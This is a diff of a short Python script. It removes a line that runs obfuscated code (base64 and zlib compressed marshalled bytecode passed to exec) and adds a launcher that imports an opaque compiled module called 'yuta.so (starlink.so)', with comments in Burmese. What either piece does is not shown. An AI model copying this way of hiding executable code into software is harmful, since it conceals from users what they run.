@@ -1,1 +1,20 @@
-import base64,zlib,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJxNTsFKw0AUfG93U5vSglfjJYigQQh4qAcRf6DSg3sRWllCDSG02ZRNc0hPXgR/wI/wbwS9mHrz5C2YH3CzRumDN8Mwb4b3CVtDWq7PNDwBB44jUL+MCjlxQJEp5fT8BiDoAkzJAQzbkAsRRuixr0aMZ9u9tN3aMb0T/DM4DvE/DR4Zr/cnJ7cuL7JVmLhXaRTP3OtcylhGvu97WFpLFcvVM9RNpuzO03l66i+L0la5FIvmXum3gOnNdjXcwwezX3pHb+y46oBlq47JCZEEsRTCYyVJs5JmRWZyjSODJBRCWVqaa7VjjIskvcsX4aUaaNk8nR1qqCgibsDeQO+bMbSrPrD+4/qV7r2zwcOoosAc0/IDMMdI9A=='))))
+import os
+import sys
+
+def run_logic():
+    print("[+] System Logic Running...")
+    try:
+        # yuta.so (starlink.so) ကို ခေါ်သုံးခြင်း
+        import yuta
+        
+        # အကယ်၍ yuta.so ထဲမှာ သီးသန့် function တစ်ခုခု ခေါ်ရမယ်ဆိုရင် 
+        # ဒီအောက်မှာ ထည့်ပေးရပါမယ်။ 
+        # ဥပမာ - yuta.menu() သို့မဟုတ် yuta.start()
+        
+    except ImportError:
+        print("[!] Error: yuta.so (starlink.so) ကို ရှာမတွေ့ပါ!")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+if __name__ == "__main__":
+    run_logic()
